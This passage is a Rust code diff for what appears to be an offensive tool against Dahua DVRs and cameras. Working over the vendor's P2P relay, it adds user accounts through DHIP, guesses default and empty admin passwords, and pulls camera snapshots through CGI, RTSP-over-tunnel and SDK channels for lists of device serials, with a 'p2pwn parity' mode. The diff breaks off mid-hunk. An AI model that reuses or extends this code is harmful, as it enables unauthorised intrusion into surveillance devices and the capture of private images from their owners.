@@ -1314,7 +1314,15 @@ async fn dhip_list_all_users(
         ("userManager.getUserInfoAll", json!("null")),
         ("userManager.getUserList", json!({})),
     ];
+    // When the first getUserInfoAll probe goes silent (device answers nothing,
+    // e.g. 4E06ED1PAZ71480 fw 5.2.1), the "null" variant will time out the same
+    // way — skip it so the reliable getConfig(Account) fallback is reached
+    // sooner instead of burning a second full timeout per call.
+    let mut info_all_silent = false;
     for (method, params) in variants {
+        if info_all_silent && *method == "userManager.getUserInfoAll" {
+            continue;
+        }
         let req = json!({"id": 10, "magic": "0x1234", "method": method,
             "params": params, "session": session_id});
         if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
@@ -1338,6 +1346,8 @@ async fn dhip_list_all_users(
             }
         } else if last_call_disc() {
             return (Vec::new(), false);
+        } else if *method == "userManager.getUserInfoAll" {
+            info_all_silent = true;
         }
     }
 
@@ -1628,6 +1638,23 @@ async fn dhip_add_user_with_account(
 ) -> Result<(), String> {
     let timeout = args.timeout_or(10);
 
+    // If the user already exists there is nothing to do. Check BEFORE the
+    // addUser attempts, while the session is still healthy: on some devices
+    // (e.g. 4E06ED1PAZ71480, fw 5.2.1) a duplicate addUser fails with a generic
+    // "Unknown error" (268959743) AND degrades the channel so that neither
+    // getUserInfoAll nor getConfig(Account) answer afterwards. The duplicate was
+    // therefore misreported as a hard FAIL that then fell through to the HTTP
+    // fallback and surfaced as a bogus "HTTP login challenge timeout".
+    let (listed, existing) =
+        dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await;
+    if listed && existing.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()) {
+        println!(
+            "  [!] user '{}' already exists on device, skipping",
+            &args.user
+        );
+        return Ok(());
+    }
+
     // Query device's supported authority list
     let authority_list =
         dhip_get_authority_list(sock, pcp_session, dhip, session_id, timeout).await;
@@ -1796,8 +1823,9 @@ async fn dhip_add_user_with_account(
             // setConfig but silently ignore the new user. Always confirm the user
             // really exists via getUserInfoAll before declaring OK.
             if t.contains("result\":true") {
-                if dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await
-                {
+                let (listed, found) =
+                    dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await;
+                if listed && found.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()) {
                     if args.verbose {
                         eprintln!("[debug] confirmed via getUserInfoAll");
                     }
@@ -1841,8 +1869,11 @@ async fn dhip_add_user_with_account(
 
     // Do NOT guess "already exists" from the error code alone: on some devices a
     // brand-new user also fails with the same error (e.g. 268632079). Confirm the
-    // user is really present via getUserInfoAll before declaring it a duplicate.
-    if dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await {
+    // user is really present via the full account-table fallback prior to
+    // declaring it a duplicate.
+    let (listed, found) =
+        dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await;
+    if listed && found.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()) {
         println!(
             "  [!] user '{}' already exists on device, skipping",
             &args.user
@@ -1871,7 +1902,11 @@ async fn dhip_add_user_with_account(
     Err(format!("all DHIP addUser variants failed [{}]", last_err))
 }
 
-/// Query userManager.getUserInfoAll via DHIP and check whether a user name exists.
+/// Check whether a user name exists, via the same full fallback chain as
+/// `dhip_list_all_users` (getUserInfoAll → getUserList → getConfig(Account)).
+/// On some devices (e.g. 4E06ED1PAZ71480, fw 5.2.1) `getUserInfoAll` is silent
+/// while `configManager.getConfig name="Account"` returns the account table, so
+/// relying on getUserInfoAll alone made duplicate detection always return false.
 async fn dhip_user_exists(
     sock: &UdpSocket,
     pcp_session: &Mutex<PTCPSession>,
@@ -1879,25 +1914,15 @@ async fn dhip_user_exists(
     session_id: u32,
     name: &str,
     timeout: Duration,
-) -> bool {
-    let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.getUserInfoAll",
-        "params": {}, "session": session_id});
-    if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
-        if let Ok(v) = serde_json::from_str::<Value>(&t) {
-            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
-                if let Some(arr) = v
-                    .get("params")
-                    .and_then(|p| p.get("users"))
-                    .and_then(|u| u.as_array())
-                {
-                    return arr
-                        .iter()
-                        .any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name));
-                }
-            }
-        }
-    }
-    false
+) -> (bool, Value) {
+    let (users, listed) =
+        dhip_list_all_users(sock, pcp_session, dhip, session_id, timeout, false).await;
+    let found = users
+        .iter()
+        .find(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name))
+        .cloned()
+        .unwrap_or(Value::Null);
+    (listed, found)
 }
 
 /// DHIP getAuthorityList — queried from device, with Smart Manager fallback.
@@ -2080,7 +2105,7 @@ async fn http_try_add_user(
         eprintln!("[debug] HTTP addUser using port {}", port);
     }
     let bind_timeout = args.timeout_or(15);
-    let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout)
+    let realm_id = ptcp_bind_retry(sock, pcp_session, port, bind_timeout, args.verbose)
         .await
         .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;
 
@@ -3070,6 +3095,123 @@ fn snapshot_output_dir(serials_file: Option<&str>) -> String {
     format!("snapshot - {}", stem)
 }
 
+/// RTSP-over-tunnel snapshot helper. Binds a PTCP realm on the device's RTSP
+/// port, relays a local port to it, and runs the real RTSP client against the
+/// local end. Used both as the *first* mechanism in p2pwn parity mode (RTSP →
+/// CGI → SDK is the order that already works on DVRs whose `snapshot.cgi`
+/// stream truncates at the relay) and as the last PTCP fallback otherwise.
+async fn grab_rtsp_tunnel(
+    sock: &UdpSocket,
+    pcp_session: &Mutex<PTCPSession>,
+    creds: &[(&str, String, String)],
+    rtsp_port: u16,
+    ch: u32,
+    probe_timeout: Duration,
+    verbose: bool,
+) -> Option<Vec<u8>> {
+    let mut rtsp_ports: Vec<u16> = vec![rtsp_port];
+    for &p in &[554u16, 854] {
+        if !rtsp_ports.contains(&p) {
+            rtsp_ports.push(p);
+        }
+    }
+    'rtsp_tunnel: for (label, ruser, rpass) in creds {
+        if ruser.is_empty() && rpass.is_empty() {
+            continue;
+        }
+        for &rport in &rtsp_ports {
+            if verbose {
+                eprintln!(
+                    "  [debug] ch{} {} RTSP-over-tunnel port {} ch={}",
+                    ch, label, rport, ch
+                );
+            }
+            let Some(realm) =
+                ptcp_bind_retry(sock, pcp_session, rport, probe_timeout, verbose).await
+            else {
+                if verbose {
+                    eprintln!(
+                        "  [debug] ch{} {} RTSP port {} bind failed",
+                        ch, label, rport
+                    );
+                }
+                continue;
+            };
+            let listener = match TcpListener::bind("127.0.0.1:0").await {
+                Ok(l) => l,
+                Err(e) => {
+                    if verbose {
+                        eprintln!("  [debug] ch{} local RTSP listener failed: {}", ch, e);
+                    }
+                    let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                    continue;
+                }
+            };
+            let Ok(local_addr) = listener.local_addr() else {
+                let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                continue;
+            };
+            let local_port = local_addr.port();
+            if verbose {
+                eprintln!(
+                    "  [debug] ch{} {} relay 127.0.0.1:{} -> device:{}",
+                    ch, label, local_port, rport
+                );
+            }
+            let client_user = ruser.clone();
+            let client_pass = rpass.clone();
+            let ch_num = ch as u16;
+            let client = tokio::spawn(async move {
+                dahua_dhip_adduser::rtsp::capture_snapshot(
+                    "127.0.0.1",
+                    local_port,
+                    ch_num,
+                    &client_user,
+                    &client_pass,
+                    probe_timeout,
+                )
+                .await
+            });
+            let accepted = tokio::time::timeout(probe_timeout, listener.accept()).await;
+            let jpeg = match accepted {
+                Ok(Ok((stream, _))) => {
+                    rtsp_forward_realm(sock, pcp_session, realm, stream, probe_timeout).await;
+                    let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                    client.await.unwrap_or(None)
+                }
+                _ => {
+                    if verbose {
+                        eprintln!(
+                            "  [debug] ch{} {} RTSP relay: no local client connected",
+                            ch, label
+                        );
+                    }
+                    let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
+                    client.await.unwrap_or(None)
+                }
+            };
+            if let Some(jp) = jpeg {
+                if verbose {
+                    eprintln!(
+                        "  [debug] ch{} OK: {} RTSP-over-tunnel port {}",
+                        ch, label, rport
+                    );
+                }
+                return Some(jp);
+            } else if verbose {
+                eprintln!(
+                    "  [debug] ch{} {} RTSP-over-tunnel port {} failed",
+                    ch, label, rport
+                );
+            }
+        }
+    }
+    if verbose {
+        eprintln!("  [debug] ch{} all RTSP-over-tunnel attempts failed", ch);
+    }
+    None
+}
+
 async fn snapshot_devices(
     serials: &[String],
     args: &Args,
@@ -3150,6 +3292,51 @@ fn dump_unusable_snapshot(
             path.display(),
             body.len()
         );
+    }
+}
+
+/// Probe every candidate bind port once and drop the ones that do not answer,
+/// so the dead ports are not re-tried for every path/credential of every
+/// channel. Must run while the device has a free PTCP slot: on a single-channel
+/// DVR a probe sent while the DHIP realm is still bound comes back `BindFailed`.
+async fn narrow_bind_ports(
+    sock: &UdpSocket,
+    pcp_session: &Mutex<PTCPSession>,
+    bind_ports: &mut Vec<u16>,
+    probe_timeout: Duration,
+    verbose: bool,
+) {
+    if bind_ports.len() <= 1 {
+        return;
+    }
+    let probe_path = "/cgi-bin/snapshot.cgi?action=snapshot&channel=1".to_string();
+    let mut live: Vec<u16> = Vec::new();
+    for &p in bind_ports.iter() {
+        let outcome = probe_bind_port(
+            sock,
+            pcp_session,
+            p,
+            &probe_path,
+            "127.0.0.1",
+            probe_timeout,
+        )
+        .await;
+        if verbose {
+            eprintln!("  [debug] port {} probe: {:?}", p, outcome);
+        }
+        if outcome == PortProbe::Alive {
+            live.push(p);
+        }
+    }
+    // Never narrow to nothing: a device that ignores the plain GET may still
+    // answer the authenticated retry, so keep the previous list as fallback.
+    if !live.is_empty() {
+        if verbose {
+            eprintln!("  [debug] bind ports narrowed {:?} → {:?}", bind_ports, live);
+        }
+        *bind_ports = live;
+    } else if verbose {
+        eprintln!("  [debug] no port answered the probe, keeping all candidates");
     }
 }
 
@@ -3334,21 +3521,13 @@ async fn snapshot_device(
     let http_port = ports.http.unwrap_or(80);
     let rtsp_port = ports.rtsp.unwrap_or(554);
 
-    // From here on nothing in the snapshot path needs the live DHIP channel: the
-    // HTTP attempts re-bind a fresh realm per request and the SDK binds its own.
-    // `7C03FF7PAZ93E44` accepts a single PTCP channel, so holding DHIP while
-    // binding HTTP (or 37777) made every bind fail. Release it once, here,
-    // after the last DHIP read (the InetWeb port query above).
-    let mut dhip_freed = true;
-    if let Some(c) = chal.as_ref() {
-        if args.verbose {
-            eprintln!(
-                "  [debug] freeing DHIP realm={} before PTCP HTTP binds",
-                c.realm_id
-            );
-        }
-        ptcp_disconnect(sock, pcp_session, c.realm_id).await;
-    }
+    // The DHIP channel stays open here: the first CGI attempt per channel runs
+    // over the live challenge realm (no bind) because some DVRs only serve
+    // their web API on the channel that carries the DHIP session
+    // (`7C03FF7PAZ93E44` answered 200 there in the pre-f744c3c flow, while a
+    // fresh bind draws silence). Only when that produces nothing is the channel
+    // freed, just before the per-request bind pipeline needs it.
+    let mut dhip_freed = !chal.is_some();
 
     // HTTP over PTCP, following p2pwn: every request gets a freshly bound realm
     // (tunnel.go:1226). The device tears the connection down when it answers 401,
@@ -3369,42 +3548,14 @@ async fn snapshot_device(
 
     // Probe each candidate port once and keep only the live ones. Without this
     // the dead ports are re-tried for every path and every credential strategy
-    // of every channel, each retry burning a full timeout.
-    if bind_ports.len() > 1 {
-        // Any real CGI path proves liveness; channel 1 is the cheapest to spell.
-        let probe_path = "/cgi-bin/snapshot.cgi?action=snapshot&channel=1".to_string();
-        let mut live: Vec<u16> = Vec::new();
-        for &p in &bind_ports {
-            let outcome = probe_bind_port(
-                sock,
-                pcp_session,
-                p,
-                &probe_path,
-                "127.0.0.1",
-                probe_timeout,
-            )
-            .await;
-            if args.verbose {
-                eprintln!("  [debug] port {} probe: {:?}", p, outcome);
-            }
-            if outcome == PortProbe::Alive {
-                live.push(p);
-            }
-        }
-        // Never narrow to nothing: a device that ignores the plain GET may still
-        // answer the authenticated retry, so keep the previous list as fallback.
-        if !live.is_empty() {
-            if args.verbose {
-                eprintln!(
-                    "  [debug] bind ports narrowed {:?} → {:?}",
-                    bind_ports, live
-                );
-            }
-            bind_ports = live;
-        } else if args.verbose {
-            eprintln!("  [debug] no port answered the probe, keeping all candidates");
-        }
+    // of every channel, each retry burning a full timeout. When the DHIP realm
+    // is still bound (single-channel DVR) every probe reads BindFailed, so the
+    // real probe runs lazily right after that realm is freed.
+    if dhip_freed {
+        narrow_bind_ports(sock, pcp_session, &mut bind_ports, probe_timeout, args.verbose).await;
     }
+
+    let mut bind_ports_probed = dhip_freed;
 
     let mut captured = 0usize;
     let mut consecutive_failures = 0usize;
@@ -3417,16 +3568,29 @@ async fn snapshot_device(
 
         // Build candidate (label, query_user, query_pass) tuples.
         let mut strategies: Vec<(&str, String, String)> = Vec::new();
-        if !session_str.is_empty() {
-            strategies.push(("session", String::new(), String::new()));
+        let p2pwn_mode_env = std::env::var_os("DAHUA_SNAP_P2PWN").is_some();
+        if p2pwn_mode_env {
+            // p2pwn parity mode: only the explicit device account (-u/-w) or
+            // --admin-pass is used; anonymous session/defaults are skipped. The
+            // relay's PTCP bind budget is tight, so exactly one credential pair
+            // is tried per mechanism.
+            if !args.admin_pass.is_empty() {
+                strategies.push(("admin", args.admin_user.clone(), args.admin_pass.clone()));
+            } else if !args.password.is_empty() {
+                strategies.push(("camera", args.user.clone(), args.password.clone()));
+            }
+        } else {
+            if !session_str.is_empty() {
+                strategies.push(("session", String::new(), String::new()));
+            }
+            if !args.admin_pass.is_empty() {
+                strategies.push(("admin", args.admin_user.clone(), args.admin_pass.clone()));
+            }
+            if !args.password.is_empty() {
+                strategies.push(("camera", args.user.clone(), args.password.clone()));
+            }
         }
-        if !args.admin_pass.is_empty() {
-            strategies.push(("admin", args.admin_user.clone(), args.admin_pass.clone()));
-        }
-        if !args.password.is_empty() {
-            strategies.push(("camera", args.user.clone(), args.password.clone()));
-        }
-        if args.try_defaults {
+        if !p2pwn_mode_env && args.try_defaults {
             let admin_user = if args.admin_user.is_empty() {
                 "admin".to_string()
             } else {
@@ -3439,7 +3603,7 @@ async fn snapshot_device(
                 strategies.push(("admin-default", admin_user.clone(), (*pw).to_string()));
             }
             // last resort: empty admin password (installer-configured devices)
-            if args.admin_pass.is_empty() {
+            if args.admin_pass.is_empty() && !p2pwn_mode_env {
                 strategies.push(("admin-empty", admin_user.clone(), String::new()));
             }
         }
@@ -3453,16 +3617,30 @@ async fn snapshot_device(
         // few KB of it and then time out with no EOI, so the image is discarded
         // as truncated. Cameras that already default to a thumbnail (352x288,
         // ~7 KB) are served by the first three variants as before.
-        let path_variants: Vec<String> = vec![
-            format!("/cgi-bin/snapshot.cgi?action=snapshot&channel={}", ch),
-            "/cgi-bin/snapshot.cgi".to_string(),
-            format!("/cgi-bin/jpeg.cgi?channel={}", ch),
-            format!(
-                "/cgi-bin/snapshot.cgi?action=snapshot&channel={}&width=352&height=288",
-                ch
-            ),
-            format!("/cgi-bin/snapshot.cgi?channel={}&width=352&height=288", ch),
-        ];
+        let path_variants: Vec<String> =
+            if std::env::var_os("DAHUA_SNAP_P2PWN").is_some() {
+                // p2pwn parity mode (env): a single clean snapshot.cgi attempt
+                // per credential strategy, then straight to SDK/RTSP. The relay
+                // agent stops ACKing binds after a burst of them, and p2pwn
+                // stays under that budget. `7F00CB6PAZ3FC73` wedged after ~10
+                // binds: the first CGI exchange answered 200 with a real JPEG,
+                // then every later bind drew silence (no CONN from the agent).
+                vec![format!(
+                    "/cgi-bin/snapshot.cgi?action=snapshot&channel={}",
+                    ch
+                )]
+            } else {
+                vec![
+                    format!("/cgi-bin/snapshot.cgi?action=snapshot&channel={}", ch),
+                    "/cgi-bin/snapshot.cgi".to_string(),
+                    format!("/cgi-bin/jpeg.cgi?channel={}", ch),
+                    format!(
+                        "/cgi-bin/snapshot.cgi?action=snapshot&channel={}&width=352&height=288",
+                        ch
+                    ),
+                    format!("/cgi-bin/snapshot.cgi?channel={}&width=352&height=288", ch),
+                ]
+            };
         // Some firmwares ignore the Authorization header and only read
         // credentials from the query string.
         let with_creds = |variant: &str, user: &str, pass: &str| -> String {
@@ -3474,6 +3652,196 @@ async fn snapshot_device(
                 format!("{}?user={}&password={}", variant, user, pass)
             }
         };
+
+        // === LIVE DHIP-channel CGI (reuse the challenge realm, no bind) ===
+        //
+        // The pre-f744c3c snapshot flow re-sent the CGI over the still-open
+        // DHIP channel and `7C03FF7PAZ93E44` answered 200 there (Sep dump
+        // ch1_admin_80.http) while every fresh bind drew nothing but silence:
+        // the DVR accepts one PTCP channel and only serves its web API on it.
+        // Try the challenge realm first; the relay bind budget is untouched
+        // because no bind is involved. Only when the realm answers with
+        // nothing usable is it freed for the per-request bind pipeline.
+        if body.is_none() && !dhip_freed {
+            if let Some(realm_id) = chal.as_ref().map(|c| c.realm_id) {
+                let mut realm_hosts = vec![http_port];
+                for p in [5000u16, 80u16] {
+                    if !realm_hosts.contains(&p) {
+                        realm_hosts.push(p);
+                    }
+                }
+                // A silent realm costs a full probe timeout and a wrong cred
+                // pair signs nothing: cap the whole probe so an offline web
+                // server cannot burn minutes before the bind pipeline runs.
+                let mut live_budget = 6usize;
+                'live: for &hp in &realm_hosts {
+                    let host = format!("127.0.0.1:{}", hp);
+                    for (label, quser, qpass) in &strategies {
+                        for variant in &path_variants {
+                            if live_budget == 0 {
+                                break 'live;
+                            }
+                            live_budget -= 1;
+                            // Try bare variant first, then with creds
+                            let mut live_paths = vec![variant.clone()];
+                            let wc = with_creds(variant, quser, qpass);
+                            if wc != *variant {
+                                live_paths.push(wc);
+                            }
+                            for path in &live_paths {
+                                if live_budget == 0 {
+                                    break 'live;
+                                }
+                                live_budget -= 1;
+                                if args.verbose {
+                                    eprintln!(
+                                        "  [debug] ch{} live-DHIP {} port={} path={}",
+                                        ch, label, hp, path
+                                    );
+                                }
+                                let some = http_get_binary_on_realm(
+                                    sock,
+                                    pcp_session,
+                                    realm_id,
+                                    &host,
+                                    path,
+                                    probe_timeout,
+                                    quser,
+                                    qpass,
+                                    &session_str,
+                                )
+                                .await;
+                                let Some((ref_h, ref_b)) = some else {
+                                    if args.verbose {
+                                        eprintln!(
+                                            "  [debug] ch{} live-DHIP {} port={} → {}",
+                                            ch,
+                                            label,
+                                            hp,
+                                            if LAST_CALL_DISC.load(Ordering::Relaxed)
+                                            {
+                                                "DISC (channel torn down)"
+                                            } else {
+                                                "no bytes"
+                                            }
+                                        );
+                                    }
+                                    continue;
+                                };
+                                last_status = Some(
+                                    ref_h
+                                        .lines()
+                                        .find(|l| l.starts_with("HTTP/"))
+                                        .unwrap_or("HTTP (no status line)")
+                                        .trim()
+                                        .to_string(),
+                                );
+                                if args.verbose {
+                                    eprintln!(
+                                        "  [debug] ch{} live-DHIP {} port={} → {} ({} bytes)",
+                                        ch,
+                                        label,
+                                        hp,
+                                        last_status.as_deref().unwrap_or(""),
+                                        ref_b.len()
+                                    );
+                                }
+                                if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
+                                    body = Some(jpeg);
+                                    if args.verbose {
+                                        eprintln!(
+                                            "  [debug] ch{} OK: {} live-DHIP port={}",
+                                            ch, label, hp
+                                        );
+                                    }
+                                    break 'live;
+                                }
+                            }
+                        }
+                        if body.is_some() {
+                            break;
+                        }
+                    }
+                    if body.is_some() {
+                        break;
+                    }
+                }
+            }
+            // The live realm answered with silence or an unusable body: free it
+            // now, the per-request bind pipeline below needs the one PTCP
+            // channel. Freed once; later channels skip the live attempt.
+            if body.is_none() {
+                if let Some(c) = chal.as_ref() {
+                    if args.verbose {
+                        eprintln!(
+                            "  [debug] ch{} freeing DHIP realm={} before bind pipeline",
+                            ch, c.realm_id
+                        );
+                    }
+                    ptcp_disconnect(sock, pcp_session, c.realm_id).await;
+                }
+                dhip_freed = true;
+                // The DHIP realm just released the single PTCP slot: now the
+                // port probe reflects reality instead of reading BindFailed.
+                if !bind_ports_probed {
+                    narrow_bind_ports(
+                        sock,
+                        pcp_session,
+                        &mut bind_ports,
+                        probe_timeout,
+                        args.verbose,
+                    )
+                    .await;
+                    bind_ports_probed = true;
+                }
+            }
+        }
+
+        if p2pwn_mode_env {
+            // p2pwn parity: RTSP is attempted before the CGI channels burn the
+            // relay's bind budget. Some DVRs truncate snapshot.cgi's stream at
+            // 3-4 KB (7F00CB6PAZ3FC73: Content-Length 10244, 3484 delivered,
+            // then the agent stops ACKing every later bind) and only serve a
+            // full frame over RTSP.
+            if body.is_none() {
+                let rtsp_creds: Vec<(&str, String, String)> = strategies
+                    .iter()
+                    .map(|(l, u, p)| (*l, u.clone(), p.clone()))
+                    .collect();
+                if let Some(jp) =
+                    grab_rtsp_tunnel(sock, pcp_session, &rtsp_creds, rtsp_port, *ch, probe_timeout, args.verbose)
+                        .await
+                {
+                    body = Some(jp);
+                }
+            }
+            // Next in p2pwn order after RTSP is the SDK channel (the CGI
+            // snapshot.cgi exchange flatlines the relay agent on some DVRs, so
+            // it comes last). The DHIP channel was already freed during port
+            // narrowing, so the 37777 bind is free to use.
+            if body.is_none() {
+                for (label, quser, qpass) in &strategies {
+                    let tag = if label.is_empty() { "sdk" } else { label };
+                    if args.verbose {
+                        eprintln!("  [debug] ch{} trying {} (SDK 37777 via tunnel)", ch, tag);
+                    }
+                    let client = sdk::SdkClient::new(quser, qpass).with_verbose(args.verbose);
+                    let jpeg = client.get_snapshot(sock, pcp_session, *ch as usize).await;
+                    if let Some(jpeg_data) = jpeg {
+                        if args.verbose {
+                            eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, tag);
+                        }
+                        body = Some(jpeg_data);
+                        break;
+                    } else if args.verbose {
+                        eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, tag);
+                    }
+                }
+                if body.is_none() && args.verbose {
+                    eprintln!("  [debug] ch{} all SDK snapshot attempts failed", ch);
+                }
+            }
+        }
 
         // === PTCP HTTP GET (fresh realm per request, challenge-driven auth) ===
         for (label, ref_quser, ref_qpass) in &strategies {
@@ -3488,7 +3856,14 @@ async fn snapshot_device(
                 // firmware that only reads the query string.
                 let clean = variant.clone();
                 let with_q = with_creds(variant, ref_quser, ref_qpass);
-                let requests: Vec<String> = if clean == with_q {
+                let p2pwn_mode = std::env::var_os("DAHUA_SNAP_P2PWN").is_some();
+                let requests: Vec<String> = if p2pwn_mode {
+                    // p2pwn sends CGI URIs bare and authenticates through the
+                    // Authorization header only; query credentials just burn a
+                    // bind, and the relay's PTCP bind budget is what actually
+                    // wedges this family of DVRs.
+                    vec![clean]
+                } else if clean == with_q {
                     vec![clean]
                 } else {
                     vec![clean, with_q]
@@ -3502,48 +3877,69 @@ async fn snapshot_device(
                             );
                         }
                         let host = format!("127.0.0.1:{}", port);
-                        let r = http_get_tunnel(
-                            sock,
-                            pcp_session,
-                            port,
-                            &host,
-                            &path,
-                            probe_timeout,
-                            ref_quser,
-                            ref_qpass,
-                            &session_str,
-                        )
-                        .await;
-                        if let Some((ref_h, ref_b)) = r {
+                        // A response that is a genuine JPEG with no EOI is a
+                        // *promising* failure: the web server answered with a
+                        // real frame but the relay dropped part of it. Fresh
+                        // binds are cheap, and one lost datagram used to
+                        // condemn the whole channel (7F00CB6PAZ3FC73 delivered
+                        // 2205/9112 bytes on the first exchange, then the DVR
+                        // went silent for every later bind). Giving the same
+                        // request a couple more attempts survives a one-off
+                        // drop; non-JPEG failures (401/403/silent) never retry.
+                        let mut trunc_retries = 0u32;
+                        const MAX_TRUNC_RETRIES: u32 = 3;
+                        loop {
+                            let some = http_get_tunnel(
+                                sock,
+                                pcp_session,
+                                port,
+                                &host,
+                                &path,
+                                probe_timeout,
+                                ref_quser,
+                                ref_qpass,
+                                &session_str,
+                            )
+                            .await;
+                            let Some((ref_h, ref_b)) = some else {
+                                break;
+                            };
                             if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
                                 body = Some(jpeg);
                                 if args.verbose {
                                     eprintln!("  [debug] ch{} OK: {} port={}", ch, label, port);
                                 }
                                 break;
-                            } else {
-                                last_status = Some(
-                                    ref_h
+                            }
+                            let truncated = ref_b.len() >= 100
+                                && ref_b.starts_with(&[0xFF, 0xD8])
+                                && !ref_b.ends_with(&[0xFF, 0xD9])
+                                && ref_h.lines().any(|l| {
+                                    l.trim_start().starts_with("HTTP/") && l.contains("200")
+                                });
+                            if truncated && trunc_retries < MAX_TRUNC_RETRIES {
+                                trunc_retries += 1;
+                                if std::env::var_os("DAHUA_TRUNC_DEBUG").is_some() {
+                                    let cl = ref_h
                                         .lines()
-                                        .find(|l| l.starts_with("HTTP/"))
-                                        .unwrap_or("HTTP (no status line)")
-                                        .trim()
-                                        .to_string(),
-                                );
-                                dump_unusable_snapshot(serial, *ch, label, port, &ref_h, &ref_b);
-                                if args.verbose {
-                                    // Full header block, not just the status line:
-                                    // a truncated snapshot is only diagnosable by
-                                    // comparing Content-Length against what arrived
-                                    // (`7C03FF7PAZ93E44` sent 200 OK with a valid
-                                    // SOI but 2203 bytes and no EOI).
+                                        .find(|l| {
+                                            l.trim_start()
+                                                .to_ascii_lowercase()
+                                                .starts_with("content-length:")
+                                        })
+                                        .map(|l| l.trim().to_string())
+                                        .unwrap_or("(none)".into());
+                                    let body = &ref_b[ref_b.len().saturating_sub(24).min(ref_b.len())..];
                                     eprintln!(
-                                        "  [debug] ch{} {} port={} → {} ({} bytes)\n{}",
-                                        ch,
-                                        label,
-                                        port,
-                                        last_status.as_deref().unwrap_or(""),
+                                        "  [trunc] {} CL={} got={} tail_bytes={:02X?} head={:02X?}",
+                                        last_status.as_deref().unwrap_or("200"),
+                                        cl,
                                         ref_b.len(),
+                                        body,
+                                        &ref_b[..ref_b.len().min(8)]
+                                    );
+                                    eprintln!(
+                                        "  [trunc] headers:\n{}",
                                         ref_h
                                             .lines()
                                             .map(|l| format!("      | {}", l.trim_end()))
@@ -3551,7 +3947,61 @@ async fn snapshot_device(
                                             .join("\n")
                                     );
                                 }
+                                if args.verbose {
+                                    eprintln!(
+                                        "  [debug] ch{} {} port={} truncated JPEG ({} bytes, no EOI) — retry {}/{}",
+                                        ch,
+                                        label,
+                                        port,
+                                        ref_b.len(),
+                                        trunc_retries,
+                                        MAX_TRUNC_RETRIES
+                                    );
+                                }
+                                continue;
                             }
+                            if args.verbose && truncated {
+                                eprintln!(
+                                    "  [debug] ch{} {} port={} still truncated after {} retries",
+                                    ch,
+                                    label,
+                                    port,
+                                    MAX_TRUNC_RETRIES
+                                );
+                            }
+                            last_status = Some(
+                                ref_h
+                                    .lines()
+                                    .find(|l| l.starts_with("HTTP/"))
+                                    .unwrap_or("HTTP (no status line)")
+                                    .trim()
+                                    .to_string(),
+                            );
+                            dump_unusable_snapshot(serial, *ch, label, port, &ref_h, &ref_b);
+                            if args.verbose {
+                                // Full header block, not just the status line:
+                                // a truncated snapshot is only diagnosable by
+                                // comparing Content-Length against what arrived
+                                // (`7C03FF7PAZ93E44` sent 200 OK with a valid
+                                // SOI but 2203 bytes and no EOI).
+                                eprintln!(
+                                    "  [debug] ch{} {} port={} → {} ({} bytes)\n{}",
+                                    ch,
+                                    label,
+                                    port,
+                                    last_status.as_deref().unwrap_or(""),
+                                    ref_b.len(),
+                                    ref_h
+                                        .lines()
+                                        .map(|l| format!("      | {}", l.trim_end()))
+                                        .collect::<Vec<_>>()
+                                        .join("\n")
+                                );
+                            }
+                            break;
+                        }
+                        if body.is_some() {
+                            break;
                         }
                     }
                 }
@@ -3565,7 +4015,7 @@ async fn snapshot_device(
         }
 
         // === POST form (raw) ===
-        if body.is_none() {
+        if body.is_none() && !p2pwn_mode_env {
             let cookie = if session_str.is_empty() {
                 String::new()
             } else {
@@ -3699,13 +4149,7 @@ async fn snapshot_device(
         // devices whose media port is not exposed to the public IP (NAT). Works
         // without a DHIP session too, like the SDK branch above.
         if body.is_none() {
-            let mut rtsp_ports: Vec<u16> = vec![rtsp_port];
-            for &p in &[554u16, 854] {
-                if !rtsp_ports.contains(&p) {
-                    rtsp_ports.push(p);
-                }
-            }
-            'rtsp_tunnel: for (label, ruser, rpass) in [
+            let rtsp_creds: Vec<(&str, String, String)> = [
                 (
                     "rtsp-tunnel-admin",
                     args.admin_user.clone(),
@@ -3716,102 +4160,21 @@ async fn snapshot_device(
                     args.user.clone(),
                     args.password.clone(),
                 ),
-            ] {
-                if ruser.is_empty() && rpass.is_empty() {
-                    continue;
-                }
-                for &rport in &rtsp_ports {
-                    if args.verbose {
-                        eprintln!(
-                            "  [debug] ch{} {} RTSP-over-tunnel port {} ch={}",
-                            ch, label, rport, ch
-                        );
-                    }
-                    let Some(realm) =
-                        ptcp_bind_retry(sock, pcp_session, rport, probe_timeout, args.verbose)
-                            .await
-                    else {
-                        if args.verbose {
-                            eprintln!(
-                                "  [debug] ch{} {} RTSP port {} bind failed",
-                                ch, label, rport
-                            );
-                        }
-                        continue;
-                    };
-                    let listener = match TcpListener::bind("127.0.0.1:0").await {
-                        Ok(l) => l,
-                        Err(e) => {
-                            if args.verbose {
-                                eprintln!("  [debug] ch{} local RTSP listener failed: {}", ch, e);
-                            }
-                            let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
-                            continue;
-                        }
-                    };
-                    let Ok(local_addr) = listener.local_addr() else {
-                        let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
-                        continue;
-                    };
-                    let local_port = local_addr.port();
-                    if args.verbose {
-                        eprintln!(
-                            "  [debug] ch{} {} relay 127.0.0.1:{} -> device:{}",
